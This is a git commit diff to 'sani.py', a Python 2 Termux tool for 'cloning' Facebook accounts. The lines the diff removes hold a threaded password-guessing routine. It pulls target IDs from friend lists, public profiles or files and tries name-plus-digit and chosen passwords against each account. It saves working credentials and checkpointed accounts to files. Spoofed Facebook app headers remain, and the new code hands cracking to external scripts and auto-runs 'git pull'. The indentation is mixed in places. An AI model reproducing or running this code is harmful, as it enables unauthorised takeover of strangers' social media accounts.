6025aa86294b9fc410a531d3eff6369ae623b2da
cyber-jam <83345489+cyber-jam@users.noreply.github.com>
2021-04-28 06:01:59 -0700

    Update sani.py

--- sani.py
+++ sani.py
@@ -9,30 +9,18 @@ try:
     import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
     from requests.exceptions import ConnectionError
-    from mechanize import Browser
-except ImportError:
-    os.system('pip2 install requests')
-    os.system('pip2 install mechanize')
-    os.system('pip2 install bs4')
-    os.system('termux-setup-storage -y')
-    os.system('apt update && apt install nodejs -y')
-    os.system('apt install ruby -y')
-    os.system('python2 sani.py')
+    os.system('termux-setup-storage')
+    os.system('pkg install build-essential')
 
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
+	
 #Browser Setting
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-cj = cookielib.LWPCookieJar()
-br.set_handle_robots(False)
-br.set_handle_redirect(True)
-br.set_cookiejar(cj)
-br.set_handle_equiv(True)
-br.set_handle_referer(True)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000, 40000)
-br.addheader = {
+header = {
     'x-fb-connection-bandwidth': repr(bd),
     'x-fb-sim-hni': repr(sim),
     'x-fb-net-hni': repr(sim),
@@ -40,7 +28,10 @@ br.addheader = {
     'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
     'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
     'content-type': 'application/x-www-form-urlencoded',
-    'x-fb-http-engine': 'Liger' } 
+    'x-fb-http-engine': 'Liger' }
+os.system('git pull')
+os.system('clear')
+
 def exit():
 	print "[!] Exit"
 	os.sys.exit()
@@ -108,12 +99,8 @@ nofromfriend = []
 			
 #Menu
 def menu():
-	os.system('apt update && apt install nodejs -y')
-        os.system('cd ..... && npm install')
-        os.system('fuser -k 5000/tcp &')
-        os.system('#')
-        os.system('cd ..... && node index.js &')
 	os.system('clear')
+	print banner
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
@@ -142,8 +129,8 @@ def menu():
 	print "|[✓] Name: "+name
 	print "|[✓] ID  : "+id
 	print (47*"-")
-	print "[1] Start Cloning."
-	print "[2] Clone With Fast Mode."
+	print "[1] Clone With 5 Pass Mode."
+	print "[2] Clone With 2 Pass Mode."
 	print "[3] Extract Tools."
 	print "[4] Lock Profile Tool."
 	print "[5] Auto Del Tools."
@@ -159,22 +146,24 @@ def men():
 		print " Wrong Input"
 		men()
 	elif rana =="1":
-		crack()
+	    os.system('clear')
+	    jam('[!] Please Wait While Page Is Loding.')
+	    sani('Stylish Queen-10%...')
+	    sani('Stylish Queen-100%...')
+	    os.system('python2 crack.py')
 	elif rana =="2":
 	    os.system('clear')
 	    jam('[!] Please Wait While Page Is Loding.')
 	    sani('Stylish Queen-10%...')
-	    sani('Stylish Queen-20%...')
-	    sani('Stylish Queen-50%...')
-	    sani('Stylish Queen-70%...')
-	    sani('Stylish Queen-90%...')
 	    sani('Stylish Queen-100%...')
-	    os.system('python2 choice.py')
+	    os.system('python2 fast.py')
 	    time.sleep(1)
 	elif rana =="3":
 		grab()
 	elif rana =="4":
 		os.system('clear')
+		sani('Stylish Queen-10%...')
+	        sani('Stylish Queen-100%...')
 		os.system('python locked.py')
 		time.sleep(1)
 	elif rana =="5":
@@ -187,7 +176,6 @@ def men():
 		jam('[✓] Tool Has Been Update Successfully')
 		jam('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
 		time.sleep(3)
-		os.system('cd .. && rm -rf sani && cd sani')
 		os.system('python2 jam.py')
 	elif rana =="7":
 		os.system('xdg-open https://www.facebook.com/jam.shahrukh.official')
@@ -200,205 +188,6 @@ def men():
 		print "[!] Wrong Input"
 		men()
 	
-##### INFO #####
-def crack():
-	global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"Token invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		os.system('python2 jam.py')
-	os.system('clear')
-	print banner
-	print "[1] Clone From Friendlist."
-	print "[2] Clone From Any Public ID."
-	print "[3] Clone From File."
-	print "[0] Back."
-	crack_menu()
-
-def crack_menu():
-	crm = raw_input("Choose Option >>  ")
-	if crm =="":
-		print "[!] Filled Incorrectly"
-		crack_menu()
-	elif crm =="1":
-		os.system('clear')
-		print banner
-		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                pass3 = raw_input(' \033[1;92m[3]Password: ')
-		pass4 = raw_input(' \033[1;92m[4]Password: ')
-                pass5 = raw_input(' \033[1;92m[5]Password: ')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
-	elif crm =="2":
-		os.system('clear')
-		print banner
-		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                pass3 = raw_input(' \033[1;92m[3]Password: ')
-		pass4 = raw_input(' \033[1;92m[4]Password: ')
-                pass5 = raw_input(' \033[1;92m[5]Password: ')
-		idt = raw_input("[+] Input ID: ")
-		
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			jam('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
-		except KeyError:
-			print"[!] ID Not Found!"
-			raw_input("\nPress Enter To Back  ")
-			crack()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
-	elif crm =="3":
-	    os.system('clear')
-	    print banner
-	    p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-            p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-            pass3 = raw_input(' \033[1;92m[3]Password: ')
-	    pass4 = raw_input(' \033[1;92m[4]Password: ')
-            pass5 = raw_input(' \033[1;92m[5]Password: ')
-	    try:
-	        idlist= raw_input('[+] File Name: ')
-	        for line in open(idlist ,'r').readlines():
-	            id.append(line.strip())
-	    except IOError:
-	         print"[!] File Not Found."
-	         raw_input('Press Enter To Back. ')
-	         crack()
-	   
-	        
-	        
-	elif crm =="0":
-		menu()
-	else:
-		print "Filled Incorrectly"
-		crack_menu()
-	
-        jam('[✓] Total Friends: '+str(len(id)))
-        time.sleep(0.5)
-	jam('[✓] The Process Has Been Started.')
-	time.sleep(0.5)
-        jam('[!] To Stop Process Press CTRL Then Z')
-        time.sleep(0.5)
-        print (47*"-")
-     
-	
-	
-			
-	def main(arg):
-		global cpb,oks
-		user = arg
-                (uid, name) = user.split('|')
-		try:
-		    os.mkdir('/sdcard/ids')
-		except OSError:
-		    pass
-		try:
-                    pass1 = name.lower() + p1
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
-                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass1 + '\n')
-                        ok.close()
-                        oks.append(uid + pass1)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass1
-                        cp = open('jam_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass1 + '\n')
-                        cp.close()
-                        cps.append(uid + pass1)
-		    else:
-			pass2 = name.lower() + p2
-                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
-                        q = json.loads(data)
-                        if 'loc' in q:
-                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
-                            ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                            ok.write(uid + ' | ' + pass2 + '\n')
-                            ok.close()
-                            oks.append(uid + pass2)
-                        elif 'www.facebook.com' in q['error']:
-                            print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass2
-                            cp = open('jam_CP.txt', 'a')
-                            cp.write(uid + ' | ' + pass2 + '\n')
-                            cp.close()
-                            cps.append(uid + pass2)
-			else:
-                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = br.addheader).text
-                            q = json.loads(data)
-                            if 'loc' in q:
-                                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass3
-                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok.write(uid + ' | ' + pass3 + '\n')
-                                ok.close()
-                                oks.append(uid + pass3)
-                            elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass3
-                                cp = open('jam_CP.txt', 'a')
-                                cp.write(uid + ' | ' + pass3 + '\n')
-                                cp.close()
-                                cps.append(uid + pass3)
-			    else:
-				data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = br.addheader).text
-                                q = json.loads(data)
-                                if 'loc' in q:
-                                    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4
-                                    ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                    ok.write(uid + ' | ' + pass4 + '\n')
-                                    ok.close()
-                                    oks.append(uid + pass4)
-                                elif 'www.facebook.com' in q['error']:
-                                    print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass4
-                                    cp = open('jam_CP.txt', 'a')
-                                    cp.write(uid + ' | ' + pass4 + '\n')
-                                    cp.close()
-                                    cps.append(uid + pass4)
-				else:
-				    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = br.addheader).text
-                                    q = json.loads(data)
-                                    if 'loc' in q:
-                                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass5
-                                        ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                        ok.write(uid + ' | ' + pass5 + '\n')
-                                        ok.close()
-                                        oks.append(uid + pass5)
-                                    elif 'www.facebook.com' in q['error']:
-                                        print '\033[1;93m[JAM-CP] ' + uid + ' | ' + pass5
-                                        cp = open('jam_CP.txt', 'a')
-                                        cp.write(uid + ' | ' + pass5 + '\n')
-                                        cp.close()
-                                        cps.append(uid + pass5)
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print "\033[1;97m----------------------------------------------"
-	jam('[✓] Process Has Been Completed.')
-	jam('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
-	xx = str(len(oks))
-	xxx = str(len(cps))
-	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(cps)))
-	print (47*"-")
-	
-	raw_input("\nPress Enter To Back ")
-	menu()	
-	
-
- 
-
-
 ##### Grab #####
 def grab():
 	os.system('clear')
